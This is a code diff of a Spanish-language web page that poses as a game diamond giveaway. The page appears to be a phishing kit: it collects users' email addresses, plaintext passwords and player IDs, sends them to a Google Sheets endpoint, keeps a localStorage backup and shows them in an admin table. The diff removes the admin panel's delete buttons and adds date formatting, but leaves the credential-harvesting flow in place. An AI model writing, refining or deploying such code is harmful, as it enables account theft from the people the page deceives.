@@ -43,7 +43,7 @@
         }
 
         .container.admin-mode {
-            max-width: 1200px;
+            max-width: 1000px;
         }
 
         .treasure-img {
@@ -166,33 +166,6 @@
             transform: translateY(-2px);
             box-shadow: 0 8px 20px rgba(212, 63, 26, 0.4);
             background: linear-gradient(135deg, #e04e28 0%, #c43a15 100%);
-        }
-
-        .btn-delete {
-            background: linear-gradient(135deg, #d43f1a 0%, #a62e0f 100%);
-            border: none;
-            border-radius: 20px;
-            color: white;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            padding: 8px 16px;
-            transition: 0.2s;
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .btn-delete:hover {
-            transform: scale(1.02);
-            box-shadow: 0 4px 12px rgba(212, 63, 26, 0.4);
-            background: linear-gradient(135deg, #e6392e 0%, #c43a15 100%);
-        }
-
-        .btn-delete:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
         }
 
         .screen {
@@ -407,7 +380,6 @@
             .diamond-row { grid-template-columns: 1fr; gap: 12px; }
             .form-card { padding: 22px 18px; }
             .admin-table th, .admin-table td { padding: 8px 6px; font-size: 11px; }
-            .btn-delete { padding: 4px 10px; font-size: 10px; }
         }
     </style>
 </head>
@@ -485,7 +457,7 @@
             </div>
         </section>
 
-        <!-- PANTALLA 5: PANEL ADMIN -->
+        <!-- PANTALLA 5: PANEL ADMIN (sin columna de acción) -->
         <section id="screenAdmin" class="screen">
             <div class="form-card" style="max-width: 100%;">
                 <div class="admin-stats">
@@ -501,15 +473,23 @@
                 <div class="admin-table-wrapper">
                     <table class="admin-table" id="adminUserTable">
                         <thead>
-                            <tr><th>#</th><th>Correo electrónico</th><th>Contraseña</th><th>ID Jugador</th><th>Fecha y Hora</th><th>Acción</th</tr>
+                            <tr>
+                                <th>#</th>
+                                <th>Correo electrónico</th>
+                                <th>Contraseña</th>
+                                <th>ID Jugador</th>
+                                <th>Fecha</th>
+                            </tr>
                         </thead>
-                        <tbody id="adminTableBody"><tr><td colspan="6" style="text-align:center;">Cargando cuentas...</td></tr></tbody>
+                        <tbody id="adminTableBody">
+                            <tr><td colspan="5" style="text-align:center;">Cargando cuentas...</td></tr>
+                        </tbody>
                     </table>
                 </div>
                 <div style="margin-top: 20px; text-align: center;">
                     <button id="refreshAdminBtn" class="btn-primary" style="background:#2c6e9e; width: auto; padding: 10px 28px;">🔄 Refrescar</button>
                 </div>
-                <p style="margin-top: 18px; font-size: 12px; opacity:0.6;">✅ Administra tus cuentas - Puedes eliminar registros individualmente</p>
+                <p style="margin-top: 18px; font-size: 12px; opacity:0.6;">✅ Todas las cuentas registradas en Google Sheets</p>
             </div>
         </section>
     </div>
@@ -526,6 +506,17 @@
         // Backup local
         const STORAGE_KEY = 'diamond_users_data_backup';
 
+        // Función para formatear fecha (solo día/mes/año)
+        function formatDate(dateString) {
+            if (!dateString) return 'Fecha no disponible';
+            try {
+                const date = new Date(dateString);
+                return `${date.getDate()}/${date.getMonth() + 1}/${date.getFullYear()}`;
+            } catch(e) {
+                return dateString.split('T')[0] || dateString;
+            }
+        }
+
         // Mostrar notificación toast
         function showToast(message, isError = false) {
             const toast = document.createElement('div');
@@ -536,7 +527,7 @@
             setTimeout(() => toast.remove(), 2500);
         }
 
-        // Guardar usuario en Google Sheets (sin no-cors para que funcione)
+        // Guardar usuario en Google Sheets
         async function saveUserToSheets(userData) {
             // Guardar en localStorage como backup
             let users = [];
@@ -554,7 +545,7 @@
             users.push(newRecord);
             localStorage.setItem(STORAGE_KEY, JSON.stringify(users));
             
-            // Enviar a Google Sheets (sin no-cors para poder recibir respuesta)
+            // Enviar a Google Sheets
             try {
                 const response = await fetch(GOOGLE_SHEETS_API_URL, {
                     method: 'POST',
@@ -576,32 +567,6 @@
             }
         }
 
-        // Eliminar usuario de Google Sheets
-        async function deleteUserFromSheets(rowIndex) {
-            try {
-                const response = await fetch(GOOGLE_SHEETS_API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        action: 'delete',
-                        rowIndex: rowIndex
-                    })
-                });
-                const result = await response.json();
-                if (result.success) {
-                    showToast("✅ Cuenta eliminada correctamente");
-                    return true;
-                } else {
-                    showToast("❌ Error al eliminar: " + result.message, true);
-                    return false;
-                }
-            } catch(error) {
-                console.error("❌ Error al eliminar:", error);
-                showToast("❌ Error de conexión al servidor", true);
-                return false;
-            }
-        }
-
         // Obtener todos los usuarios desde Google Sheets
         async function getAllUsers() {
             try {
@@ -613,7 +578,6 @@
                 return [];
             } catch(e) {
                 console.log("Error al obtener de Sheets:", e);
-                showToast("⚠️ Usando datos locales (sin conexión)", true);
                 return getUsersFromLocalStorage();
             }
         }
@@ -627,7 +591,7 @@
             } catch(e) { return []; }
         }
 
-        // Renderizar tabla de cuentas con botones de eliminar
+        // Renderizar tabla de cuentas (sin columna de acción)
         async function renderAdminTable() {
             const users = await getAllUsers();
             const tbody = document.getElementById('adminTableBody');
@@ -640,7 +604,7 @@
             }
             
             if (users.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">📭 No hay cuentas registradas aún</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;">📭 No hay cuentas registradas aún</td></tr>';
                 return;
             }
             
@@ -654,28 +618,8 @@
                 row.insertCell(1).textContent = user.email || 'N/A';
                 row.insertCell(2).textContent = user.password || 'N/A';
                 row.insertCell(3).textContent = user.playerId || 'N/A';
-                row.insertCell(4).textContent = user.fecha || 'Fecha no disponible';
-                
-                const actionCell = row.insertCell(5);
-                const deleteBtn = document.createElement('button');
-                deleteBtn.innerHTML = '🗑️ Eliminar';
-                deleteBtn.className = 'btn-delete';
-                deleteBtn.onclick = async () => {
-                    if (confirm(`¿Eliminar la cuenta de ${user.email}?\nEsta acción no se puede deshacer.`)) {
-                        deleteBtn.disabled = true;
-                        deleteBtn.innerHTML = '<span class="loading-spinner"></span>';
-                        
-                        const success = await deleteUserFromSheets(user.rowIndex);
-                        
-                        if (success) {
-                            await renderAdminTable();
-                        } else {
-                            deleteBtn.disabled = false;
-                            deleteBtn.innerHTML = '🗑️ Eliminar';
-                        }
-                    }
-                };
-                actionCell.appendChild(deleteBtn);
+                // Mostrar solo la fecha (sin hora)
+                row.insertCell(4).textContent = formatDate(user.fecha);
             }
         }
 
@@ -919,7 +863,7 @@
             if (playerIdInput) playerIdInput.value = '';
             if (idMessage) idMessage.textContent = '';
             if (receiveBtn) receiveBtn.disabled = true;
-            console.log("🚀 Sistema conectado a Google Sheets - Eliminación de cuentas activada");
+            console.log("🚀 Sistema conectado a Google Sheets");
         });
 
         // ========== PARTÍCULAS ==========
